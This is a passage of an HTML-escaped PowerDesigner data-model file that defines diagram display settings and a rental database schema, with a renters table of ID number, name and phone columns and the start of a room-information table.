/&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Icon&amp;quot; Attribute=&amp;quot;IconPicture&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;强制顶部对齐&amp;quot; Attribute=&amp;quot;TextStyle&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;Relationship.Entity1ToEntity2Role=YesRelationship.Entity2ToEntity1RoleCardinality=NoRelationship.Entity1ToEntity2RoleDominant=YesRelationship.Stereotype=YesRelationship.DisplayName=YesRelationship.JoinExpression=NoRelationship.Entity2ToEntity1Role=YesRelationship.Entity1ToEntity2RoleCardinality=NoRelationship.Entity2ToEntity1RoleDominant=YesRelationship_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;源&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Role&amp;quot; Attribute=&amp;quot;Entity1ToEntity2Role&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Role&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Cardinality&amp;quot; Attribute=&amp;quot;Entity2ToEntity1RoleCardinality&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Cardinality&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Dominance&amp;quot; Attribute=&amp;quot;Entity1ToEntity2RoleDominant&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Dominance&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;居中&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;ExclusiveChoice Name=&amp;quot;Exclusive Choice&amp;quot; Mandatory=&amp;quot;No&amp;quot; Display=&amp;quot;HorizontalRadios&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;名称&amp;quot; Attribute=&amp;quot;DisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;连接&amp;quot; Attribute=&amp;quot;JoinExpression&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;连接&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/ExclusiveChoice&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;Destination&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Role&amp;quot; Attribute=&amp;quot;Entity2ToEntity1Role&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Role&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Cardinality&amp;quot; Attribute=&amp;quot;Entity1ToEntity2RoleCardinality&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Cardinality&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Dominance&amp;quot; Attribute=&amp;quot;Entity2ToEntity1RoleDominant&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Dominance&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;Inheritance.Stereotype=YesInheritance.DisplayName=YesInheritance.IconPicture=NoInheritance.TextStyle=NoInheritance_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;名称&amp;quot; Attribute=&amp;quot;DisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;Separator Name=&amp;quot;Separator&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Icon&amp;quot; Attribute=&amp;quot;IconPicture&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;强制顶部对齐&amp;quot; Attribute=&amp;quot;TextStyle&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;[DisplayPreferences\\Symbol][DisplayPreferences\\Symbol\\FRMEOBJ]STRNFont=Arial,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0LABLFont=Arial,8,NLABLFont color=0 0 0AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoWidth=6000Height=2000Brush color=255 255 255Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=64Brush gradient color=192 192 192Brush background image=Custom shape=Custom text mode=0Pen=1 0 255 128 128Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\FRMELNK]CENTERFont=Arial,8,NCENTERFont color=0 0 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 128 255Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\USRDEPD]CENTERFont=新宋体,8,NCENTERFont color=0 0 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=2 0 128 0 64Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\FILO]OBJSTRNFont=新宋体,8,NOBJSTRNFont color=0 0 0DISPNAMEFont=新宋体,8,NDISPNAMEFont color=0 0 0LCNMFont=新宋体,8,NLCNMFont color=0 0 0AutoAdjustToText=YesKeep aspect=YesKeep center=YesKeep size=NoWidth=2400Height=2400Brush color=255 255 255Fill Color=NoBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 0 0 255Shadow color=192 192 192Shadow=-1[DisplayPreferences\\Symbol\\PDMPCKG]STRNFont=Arial,8,NSTRNFont color=0, 0, 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0, 0, 0LABLFont=Arial,8,NLABLFont color=0, 0, 0AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoWidth=4800Height=3600Brush color=255 255 192Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=65Brush gradient color=255 255 255Brush background image=Custom shape=Custom text mode=0Pen=1 0 178 178 178Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\TABL]STRNFont=Arial,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0OWNRDISPNAMEFont=新宋体,8,NOWNRDISPNAMEFont color=0, 0, 0ColumnsFont=Arial,8,NColumnsFont color=0 0 0TablePkColumnsFont=Arial,8,UTablePkColumnsFont color=0 0 0TableFkColumnsFont=Arial,8,NTableFkColumnsFont color=0 0 0KeysFont=Arial,8,NKeysFont color=0 0 0IndexesFont=Arial,8,NIndexesFont color=0 0 0TriggersFont=Arial,8,NTriggersFont color=0 0 0LABLFont=Arial,8,NLABLFont color=0 0 0AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoWidth=4800Height=4000Brush color=210 137 2Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=65Brush gradient color=255 255 255Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 64 0Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\VIEW]STRNFont=Arial,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0OWNRDISPNAMEFont=新宋体,8,NOWNRDISPNAMEFont color=0, 0, 0ColumnsFont=Arial,8,NColumnsFont color=0 0 0TablePkColumnsFont=新宋体,8,UTablePkColumnsFont color=0, 0, 0TableFkColumnsFont=新宋体,8,NTableFkColumnsFont color=0, 0, 0TemporaryVTablesFont=Arial,8,NTemporaryVTablesFont color=0 0 0IndexesFont=Arial,8,NIndexesFont color=0 0 0LABLFont=Arial,8,NLABLFont color=0 0 0AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoWidth=4800Height=4000Brush color=233 202 131Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=65Brush gradient color=255 255 255Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 128 128Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\PROC]STRNFont=Arial,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0OWNRDISPNAMEFont=新宋体,8,NOWNRDISPNAMEFont color=0, 0, 0LABLFont=Arial,8,NLABLFont color=0 0 0AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoWidth=4000Height=1000Brush color=255 255 192Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=65Brush gradient color=255 255 255Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 108 0Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\REFR]SOURCEFont=新宋体,8,NSOURCEFont color=0, 0, 0CENTERFont=新宋体,8,NCENTERFont color=0, 0, 0DESTINATIONFont=新宋体,8,NDESTINATIONFont color=0, 0, 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 0 64Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\VREF]SOURCEFont=新宋体,8,NSOURCEFont color=0, 0, 0CENTERFont=新宋体,8,NCENTERFont color=0, 0, 0DESTINATIONFont=新宋体,8,NDESTINATIONFont color=0, 0, 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 0 64Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\Free Symbol]Free TextFont=Arial,8,NFree TextFont color=0 0 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 64 0Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\LDMPCKG]STRNFont=Arial,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0LABLFont=Arial,8,NLABLFont color=0 0 0AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoWidth=4800Height=3600Brush color=255 255 192Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=65Brush gradient color=255 255 255Brush background image=Custom shape=Custom text mode=0Pen=1 0 178 178 178Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\LDMENTT]STRNFont=Arial,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0AttributesFont=Arial,8,NAttributesFont color=0 0 0EntityPrimaryAttributeFont=Arial,8,UEntityPrimaryAttributeFont color=0 0 0EntityForeignAttributeFont=Arial,8,NEntityForeignAttributeFont color=0 0 0IdentifiersFont=Arial,8,NIdentifiersFont color=0 0 0LABLFont=Arial,8,NLABLFont color=0 0 0AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoWidth=4800Height=4000Brush color=234 181 21Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=65Brush gradient color=255 255 255Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 64 0Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\LDMRLSH]SOURCEFont=新宋体,8,NSOURCEFont color=0 0 0CENTERFont=新宋体,8,NCENTERFont color=0 0 0DESTINATIONFont=新宋体,8,NDESTINATIONFont color=0 0 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 0 64Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\LDMINHR]STRNFont=新宋体,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0AutoAdjustToText=NoKeep aspect=NoKeep center=NoKeep size=YesWidth=1575Height=1000Brush color=250 241 211Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 64 0Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\LDMLINH]CENTERFont=新宋体,8,NCENTERFont color=0 0 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 64 0Shadow color=192 192 192Shadow=0[DisplayPreferences\\LDM]&lt;/a:DisplayPreferences&gt;&lt;a:PaperSize&gt;(8268, 11693)&lt;/a:PaperSize&gt;&lt;a:PageMargins&gt;((315,354), (433,354))&lt;/a:PageMargins&gt;&lt;a:PageOrientation&gt;1&lt;/a:PageOrientation&gt;&lt;a:PaperSource&gt;15&lt;/a:PaperSource&gt;&lt;c:Symbols&gt;&lt;o:ReferenceSymbol Id=&quot;o27&quot;&gt;&lt;a:ModificationDate&gt;1618333775&lt;/a:ModificationDate&gt;&lt;a:Rect&gt;((-32044,6560), (-10099,8359))&lt;/a:Rect&gt;&lt;a:ListOfPoints&gt;((-10499,7469),(-31644,7469))&lt;/a:ListOfPoints&gt;&lt;a:CornerStyle&gt;2&lt;/a:CornerStyle&gt;&lt;a:ArrowStyle&gt;1&lt;/a:ArrowStyle&gt;&lt;a:LineColor&gt;4194432&lt;/a:LineColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;CENTER 0 新宋体,8,NSOURCE 0 新宋体,8,NDESTINATION 0 新宋体,8,N&lt;/a:FontList&gt;&lt;c:SourceSymbol&gt;&lt;o:TableSymbol Ref=&quot;o28&quot;/&gt;&lt;/c:SourceSymbol&gt;&lt;c:DestinationSymbol&gt;&lt;o:TableSymbol Ref=&quot;o29&quot;/&gt;&lt;/c:DestinationSymbol&gt;&lt;c:Object&gt;&lt;o:Reference Ref=&quot;o30&quot;/&gt;&lt;/c:Object&gt;&lt;/o:ReferenceSymbol&gt;&lt;o:ReferenceSymbol Id=&quot;o31&quot;&gt;&lt;a:ModificationDate&gt;1618333041&lt;/a:ModificationDate&gt;&lt;a:Rect&gt;((-14280,-5981), (-2520,5740))&lt;/a:Rect&gt;&lt;a:ListOfPoints&gt;((-8400,5340),(-8400,-5581))&lt;/a:ListOfPoints&gt;&lt;a:CornerStyle&gt;2&lt;/a:CornerStyle&gt;&lt;a:ArrowStyle&gt;1&lt;/a:ArrowStyle&gt;&lt;a:LineColor&gt;4194432&lt;/a:LineColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;CENTER 0 新宋体,8,NSOURCE 0 新宋体,8,NDESTINATION 0 新宋体,8,N&lt;/a:FontList&gt;&lt;c:SourceSymbol&gt;&lt;o:TableSymbol Ref=&quot;o28&quot;/&gt;&lt;/c:SourceSymbol&gt;&lt;c:DestinationSymbol&gt;&lt;o:TableSymbol Ref=&quot;o32&quot;/&gt;&lt;/c:DestinationSymbol&gt;&lt;c:Object&gt;&lt;o:Reference Ref=&quot;o33&quot;/&gt;&lt;/c:Object&gt;&lt;/o:ReferenceSymbol&gt;&lt;o:TableSymbol Id=&quot;o29&quot;&gt;&lt;a:ModificationDate&gt;1618333775&lt;/a:ModificationDate&gt;&lt;a:IconMode&gt;-1&lt;/a:IconMode&gt;&lt;a:Rect&gt;((-38976,4290), (-31644,10648))&lt;/a:Rect&gt;&lt;a:LineColor&gt;16512&lt;/a:LineColor&gt;&lt;a:FillColor&gt;1422826&lt;/a:FillColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;STRN 0 Arial,8,NDISPNAME 0 Arial,8,NOWNRDISPNAME 0 Arial,8,NColumns 0 Arial,8,NTablePkColumns 0 Arial,8,UTableFkColumns 0 Arial,8,NKeys 0 Arial,8,NIndexes 0 Arial,8,NTriggers 0 Arial,8,NLABL 0 Arial,8,N&lt;/a:FontList&gt;&lt;a:BrushStyle&gt;6&lt;/a:BrushStyle&gt;&lt;a:GradientFillMode&gt;65&lt;/a:GradientFillMode&gt;&lt;a:GradientEndColor&gt;16777215&lt;/a:GradientEndColor&gt;&lt;c:Object&gt;&lt;o:Table Ref=&quot;o34&quot;/&gt;&lt;/c:Object&gt;&lt;/o:TableSymbol&gt;&lt;o:TableSymbol Id=&quot;o32&quot;&gt;&lt;a:ModificationDate&gt;1618333041&lt;/a:ModificationDate&gt;&lt;a:IconMode&gt;-1&lt;/a:IconMode&gt;&lt;a:Rect&gt;((-10800,-10019), (-6000,-5581))&lt;/a:Rect&gt;&lt;a:AutoAdjustToText&gt;0&lt;/a:AutoAdjustToText&gt;&lt;a:LineColor&gt;4227200&lt;/a:LineColor&gt;&lt;a:FillColor&gt;8637161&lt;/a:FillColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;STRN 0 Arial,8,NDISPNAME 0 Arial,8,NOWNRDISPNAME 0 Arial,8,NColumns 0 Arial,8,NTablePkColumns 0 Arial,8,UTableFkColumns 0 Arial,8,NKeys 0 Arial,8,NIndexes 0 Arial,8,NTriggers 0 Arial,8,NLABL 0 Arial,8,N&lt;/a:FontList&gt;&lt;a:BrushStyle&gt;6&lt;/a:BrushStyle&gt;&lt;a:GradientFillMode&gt;65&lt;/a:GradientFillMode&gt;&lt;a:GradientEndColor&gt;16777215&lt;/a:GradientEndColor&gt;&lt;c:Object&gt;&lt;o:Table Ref=&quot;o21&quot;/&gt;&lt;/c:Object&gt;&lt;/o:TableSymbol&gt;&lt;o:TableSymbol Id=&quot;o28&quot;&gt;&lt;a:IconMode&gt;-1&lt;/a:IconMode&gt;&lt;a:Rect&gt;((-10499,5340), (-5143,9778))&lt;/a:Rect&gt;&lt;a:AutoAdjustToText&gt;0&lt;/a:AutoAdjustToText&gt;&lt;a:LineColor&gt;16512&lt;/a:LineColor&gt;&lt;a:FillColor&gt;1422826&lt;/a:FillColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;STRN 0 Arial,8,NDISPNAME 0 Arial,8,NOWNRDISPNAME 0 Arial,8,NColumns 0 Arial,8,NTablePkColumns 0 Arial,8,UTableFkColumns 0 Arial,8,NKeys 0 Arial,8,NIndexes 0 Arial,8,NTriggers 0 Arial,8,NLABL 0 Arial,8,N&lt;/a:FontList&gt;&lt;a:BrushStyle&gt;6&lt;/a:BrushStyle&gt;&lt;a:GradientFillMode&gt;65&lt;/a:GradientFillMode&gt;&lt;a:GradientEndColor&gt;16777215&lt;/a:GradientEndColor&gt;&lt;c:Object&gt;&lt;o:Table Ref=&quot;o35&quot;/&gt;&lt;/c:Object&gt;&lt;/o:TableSymbol&gt;&lt;/c:Symbols&gt;&lt;/o:PhysicalDiagram&gt;&lt;/c:PhysicalDiagrams&gt;&lt;c:DefaultDiagram&gt;&lt;o:PhysicalDiagram Ref=&quot;o5&quot;/&gt;&lt;/c:DefaultDiagram&gt;&lt;c:Tables&gt;&lt;o:Table Id=&quot;o21&quot;&gt;&lt;a:ObjectID&gt;00ED4A2F-1E4B-4B16-879F-0C089F5FD737&lt;/a:ObjectID&gt;&lt;a:Name&gt;租客&lt;/a:Name&gt;&lt;a:Code&gt;renters&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333944&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;DA62BDB4-4F45-42B4-B9F1-24B5F8BDDC3B&#125;DAT 1618333034ORG &#123;40F6E014-B48E-4682-AC15-11718F891E8F&#125;DAT 1618325546&lt;/a:History&gt;&lt;a:TotalSavingCurrency/&gt;&lt;c:Columns&gt;&lt;o:Column Id=&quot;o36&quot;&gt;&lt;a:ObjectID&gt;F398F12D-A755-4E70-A1D3-CE12900AD9E2&lt;/a:ObjectID&gt;&lt;a:Name&gt;身份证号&lt;/a:Name&gt;&lt;a:Code&gt;RenterIDNum&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333291&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;26F2FC6F-1C19-473D-91A2-81A0340F2F3C&#125;DAT 1618333034ORG &#123;4AFE59F8-46B5-4D94-9E36-D1C0C6A93550&#125;DAT 1618325546ATT NAMEATT CODE&lt;/a:History&gt;&lt;a:DataType&gt;VARCHAR(18)&lt;/a:DataType&gt;&lt;a:Length&gt;18&lt;/a:Length&gt;&lt;a:Column.Mandatory&gt;1&lt;/a:Column.Mandatory&gt;&lt;/o:Column&gt;&lt;o:Column Id=&quot;o37&quot;&gt;&lt;a:ObjectID&gt;7DFF8D43-01D2-4B48-9E60-7C319D58DA2D&lt;/a:ObjectID&gt;&lt;a:Name&gt;租客姓名&lt;/a:Name&gt;&lt;a:Code&gt;RenterName&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333033&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;DBDE509E-E263-4805-A8BE-E62FC958FBC5&#125;DAT 1618333034ORG &#123;AE9DAA19-73C6-4ED9-993D-8AC65DF80478&#125;DAT 1618325546&lt;/a:History&gt;&lt;a:DataType&gt;VARCHAR(20)&lt;/a:DataType&gt;&lt;a:Length&gt;20&lt;/a:Length&gt;&lt;a:Column.Mandatory&gt;1&lt;/a:Column.Mandatory&gt;&lt;/o:Column&gt;&lt;o:Column Id=&quot;o38&quot;&gt;&lt;a:ObjectID&gt;39C1A003-B039-4D9A-B1D7-C449C207CEFF&lt;/a:ObjectID&gt;&lt;a:Name&gt;租客电话&lt;/a:Name&gt;&lt;a:Code&gt;RenterTel&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333033&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;6CA49AD3-B371-4CAE-9EEE-6F69DB732044&#125;DAT 1618333034ORG &#123;83591775-C27F-46DA-AB5A-FAB8C1006897&#125;DAT 1618325546&lt;/a:History&gt;&lt;a:DataType&gt;VARCHAR(11)&lt;/a:DataType&gt;&lt;a:Length&gt;11&lt;/a:Length&gt;&lt;a:Column.Mandatory&gt;1&lt;/a:Column.Mandatory&gt;&lt;/o:Column&gt;&lt;/c:Columns&gt;&lt;c:Keys&gt;&lt;o:Key Id=&quot;o39&quot;&gt;&lt;a:ObjectID&gt;9A94E07C-D643-4D88-B385-FE9E57356CDC&lt;/a:ObjectID&gt;&lt;a:Name&gt;Identifier_1&lt;/a:Name&gt;&lt;a:Code&gt;Identifier_1&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333033&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;9BE124CB-12DB-4BDF-866B-68C48490FECA&#125;DAT 1618333034ORG &#123;F965A0EE-B3E3-438F-A5E6-1538D2E7B693&#125;DAT 1618325546&lt;/a:History&gt;&lt;c:Key.Columns&gt;&lt;o:Column Ref=&quot;o36&quot;/&gt;&lt;/c:Key.Columns&gt;&lt;/o:Key&gt;&lt;/c:Keys&gt;&lt;c:Indexes&gt;&lt;o:Index Id=&quot;o40&quot;&gt;&lt;a:ObjectID&gt;E1B5D051-66D9-4ABC-B76E-DF843DB3A773&lt;/a:ObjectID&gt;&lt;a:Name&gt;renters_PK&lt;/a:Name&gt;&lt;a:Code&gt;renters_PK&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333034&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333034&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:Unique&gt;1&lt;/a:Unique&gt;&lt;c:LinkedObject&gt;&lt;o:Key Ref=&quot;o39&quot;/&gt;&lt;/c:LinkedObject&gt;&lt;c:IndexColumns&gt;&lt;o:IndexColumn Id=&quot;o41&quot;&gt;&lt;a:ObjectID&gt;ED7F5FD5-6452-4E91-AC7C-636F21F34750&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618333034&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333034&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Column&gt;&lt;o:Column Ref=&quot;o36&quot;/&gt;&lt;/c:Column&gt;&lt;/o:IndexColumn&gt;&lt;/c:IndexColumns&gt;&lt;/o:Index&gt;&lt;/c:Indexes&gt;&lt;c:PrimaryKey&gt;&lt;o:Key Ref=&quot;o39&quot;/&gt;&lt;/c:PrimaryKey&gt;&lt;/o:Table&gt;&lt;o:Table Id=&quot;o22&quot;&gt;&lt;a:ObjectID&gt;DB194948-86C2-4348-947F-E35ABFEED160&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋&lt;/a:Name&gt;&lt;a:Code&gt;RoomInfo&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333925&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;CB63B9C2-21E7-455C-9C01-707F0B836FDB&#125;DAT 1618333034ORG &#123;FDB75834-3BC6-4BEF-9B44-55D93226836C&#125;DAT 1618325546&lt;/a:History&gt;&lt;a:TotalSavingCurrency/&gt;&lt;c:Columns&gt;&lt;o:Column 